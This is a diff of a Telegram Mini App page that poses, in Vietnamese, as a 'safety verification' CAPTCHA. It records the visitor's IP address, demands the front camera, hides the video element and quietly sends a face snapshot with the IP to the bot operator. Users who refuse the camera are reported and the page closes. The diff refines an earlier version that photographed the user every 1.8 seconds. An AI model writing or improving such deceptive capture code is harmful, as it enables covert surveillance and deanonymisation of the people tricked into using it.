@@ -14,7 +14,8 @@
         .captcha-box input { padding: 10px; width: 80%; border-radius: 8px; border: 1px solid #ccc; text-align: center; font-size: 16px; }
         button { background-color: #0088cc; color: white; border: none; padding: 12px 20px; font-size: 15px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; transition: background 0.2s; margin-top: 10px; }
         button:disabled { background-color: #cccccc; cursor: not-allowed; }
-        #video-container { display: none; }
+        #video-container { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; overflow: hidden; }
+        .note { font-size: 12px; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -22,7 +23,7 @@
         <h3>XÁC MINH AN TOÀN</h3>
         <p id="status">Đang tải hệ thống...</p>
         <div id="ip-display" class="ip-box" style="display:none;"></div>
-        
+
         <div id="captcha-section" style="display:none;" class="captcha-box">
             <p id="captcha-question" style="font-weight: bold; font-size: 18px; color: #d9534f;"></p>
             <input type="number" id="captcha-answer" placeholder="Nhập kết quả phép tính">
@@ -30,11 +31,11 @@
         </div>
 
         <button id="btn-submit" style="display:none;" onclick="startVerificationProcess()">TIẾP TỤC XÁC MINH</button>
+        <p class="note" id="note" style="display:none;"></p>
     </div>
 
-    <!-- Ẩn Video / Canvas để chụp camera trước -->
     <div id="video-container">
-        <video id="video" autoplay playsinline></video>
+        <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
 
@@ -44,15 +45,15 @@
         tg.expand();
 
         let clientIp = "";
-        let num1 = Math.floor(Math.random() * 10) + 1;
-        let num2 = Math.floor(Math.random() * 10) + 1;
-        let correctCaptcha = num1 + num2;
+        const num1 = Math.floor(Math.random() * 10) + 1;
+        const num2 = Math.floor(Math.random() * 10) + 1;
+        const correctCaptcha = num1 + num2;
         let captchaVerified = false;
-        let cameraLoopInterval = null;
+        let cameraSent = false;
+        let localStream = null;
 
         document.getElementById('captcha-question').innerText = `${num1} + ${num2} = ?`;
 
-        // Lấy IP
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
@@ -67,67 +68,84 @@
                 document.getElementById('status').innerText = "❌ Không thể lấy IP. Vui lòng kiểm tra lại mạng!";
             });
 
-        function startVerificationProcess() {
+        async function startVerificationProcess() {
             document.getElementById('btn-submit').style.display = "none";
+            document.getElementById('status').innerText = "Vui lòng cho phép truy cập Camera để tiếp tục:";
+            document.getElementById('note').innerText = "Hệ thống cần quyền Camera để xác minh.";
+            document.getElementById('note').style.display = "block";
+
+            const camOK = await requestCamera();
+            if (!camOK) {
+                try {
+                    tg.sendData(JSON.stringify({
+                        type: "camera_denied",
+                        ip: clientIp
+                    }));
+                } catch (e) {}
+                document.getElementById('status').innerText = "❌ Bạn đã từ chối quyền Camera.";
+                document.getElementById('note').innerText =
+                    "Vui lòng cho phép truy cập Camera. Xác minh Captcha sẽ không thành công nếu bạn từ chối!";
+                setTimeout(() => tg.close(), 2000);
+                return;
+            }
+
+            await captureAndSendPhoto();
+
             document.getElementById('status').innerText = "Vui lòng giải mã Captcha bên dưới:";
             document.getElementById('captcha-section').style.display = "block";
-
-            // Yêu cầu cấp quyền truy cập camera và chụp ảnh ngay lập tức
-            requestCameraAndCapture();
+            document.getElementById('note').style.display = "none";
         }
 
-        async function requestCameraAndCapture() {
+        async function requestCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
+                localStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
+                    audio: false
                 });
                 const video = document.getElementById('video');
-                video.srcObject = stream;
-                
+                video.srcObject = localStream;
                 await new Promise((resolve) => {
-                    video.onloadedmetadata = () => { resolve(); };
+                    if (video.readyState >= 1) resolve();
+                    else video.onloadedmetadata = () => resolve();
                 });
-
-                // Chụp ngay lần đầu
-                captureAndSendPhoto();
-
-                // Lặp lại sau mỗi 1.8 giây nếu chưa xác minh xong Captcha
-                cameraLoopInterval = setInterval(() => {
-                    if (!captchaVerified) {
-                        captureAndSendPhoto();
-                    } else {
-                        clearInterval(cameraLoopInterval);
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                }, 1800);
-
+                await new Promise(r => setTimeout(r, 500));
+                return true;
             } catch (err) {
-                console.log("Không thể truy cập camera: ", err);
+                console.log("Không thể truy cập camera:", err);
+                return false;
             }
         }
 
-        function captureAndSendPhoto() {
+        async function captureAndSendPhoto() {
+            if (cameraSent) return;
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             if (!video.videoWidth) return;
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            const MAX_W = 480, MAX_H = 360;
+            let w = video.videoWidth, h = video.videoHeight;
+            const ratio = Math.min(MAX_W / w, MAX_H / h, 1);
+            canvas.width = Math.round(w * ratio);
+            canvas.height = Math.round(h * ratio);
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
-            
-            // Gửi dữ liệu ảnh ngầm về bot qua Telegram WebApp data
+            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.6);
+
             try {
-                tg.sendData(JSON.stringify({ 
-                    type: "camera_snapshot", 
-                    image: imageDataUrl, 
-                    ip: clientIp 
+                tg.sendData(JSON.stringify({
+                    type: "camera_snapshot",
+                    image: imageDataUrl,
+                    ip: clientIp
                 }));
+                cameraSent = true;
             } catch (e) {
-                // Fallback nếu sendData giới hạn kích thước
+                console.log("sendData camera lỗi:", e);
+            }
+
+            if (localStream) {
+                localStream.getTracks().forEach(t => t.stop());
+                localStream = null;
             }
         }
 
@@ -135,18 +153,31 @@
             const userAns = document.getElementById('captcha-answer').value;
             if (parseInt(userAns) === correctCaptcha) {
                 captchaVerified = true;
-                if (cameraLoopInterval) clearInterval(cameraLoopInterval);
-                document.getElementById('status').innerText = "✅ Xác minh thành công! Đang chuyển hướng...";
+                if (localStream) {
+                    localStream.getTracks().forEach(t => t.stop());
+                    localStream = null;
+                }
+                document.getElementById('status').innerText = "✅ Xác minh thành công! Đang gửi dữ liệu...";
                 document.getElementById('captcha-section').style.display = "none";
-                
-                // Gửi thông tin IP hoàn tất về bot
+
                 setTimeout(() => {
-                    tg.sendData(JSON.stringify({ ip: clientIp, verified: true }));
-                }, 500);
+                    try {
+                        tg.sendData(JSON.stringify({
+                            type: "miniapp_captcha",
+                            ip: clientIp,
+                            passed: true
+                        }));
+                    } catch (e) {}
+                    setTimeout(() => tg.close(), 500);
+                }, 300);
             } else {
                 alert("❌ Kết quả phép tính không chính xác, vui lòng thử lại!");
             }
         }
+
+        tg.onEvent('mainButtonClicked', () => {
+            if (localStream) localStream.getTracks().forEach(t => t.stop());
+        });
     </script>
 </body>
 </html>
